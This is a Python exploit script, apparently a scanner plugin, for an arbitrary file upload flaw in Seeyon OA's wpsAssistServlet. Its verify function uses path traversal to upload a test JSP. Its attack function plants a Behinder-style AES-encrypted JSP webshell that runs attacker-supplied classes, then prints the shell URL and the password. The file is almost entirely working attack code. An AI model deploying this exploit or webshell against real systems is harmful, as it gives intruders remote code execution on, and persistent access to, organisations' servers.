import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '致远OA wpsAssistServlet 任意文件上传-2022',
        'vulnerable': False,
        'attack': True,
        'about': 'https://mp.weixin.qq.com/s/sWvB0f-Z5qqw-zfImS1tww',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 8)) + '.jsp'
    payload = f'/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{filename}&fileId=2'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '--59229605f98b8cf290a7b8908b34616b\r\nContent-Disposition: form-data; name="upload"; filename="123.xls"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n{0}\r\n--59229605f98b8cf290a7b8908b34616b--'.format(shell)
    verify_url = urllib.parse.urljoin(url, filename)
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200:
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 8)) + '.jsp'
    payload = f'/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{filename}&fileId=2'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '--59229605f98b8cf290a7b8908b34616b\r\nContent-Disposition: form-data; name="upload"; filename="123.xls"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n{0}\r\n--59229605f98b8cf290a7b8908b34616b--'.format(shell)
    verify_url = urllib.parse.urljoin(url, filename)
    print("[+] exploit loading ......")
    time.sleep(2)
    try:
        print("[+] 正在上传冰蝎webshell")
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200:
            print("[+] 上传成功，正在检查是否存在?")
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200:
                print("[*] 上传成功! webshell(冰蝎): ", verify_url)
                print("[*] 密码: rebeyond")
                return True
        return False
    except:
        return False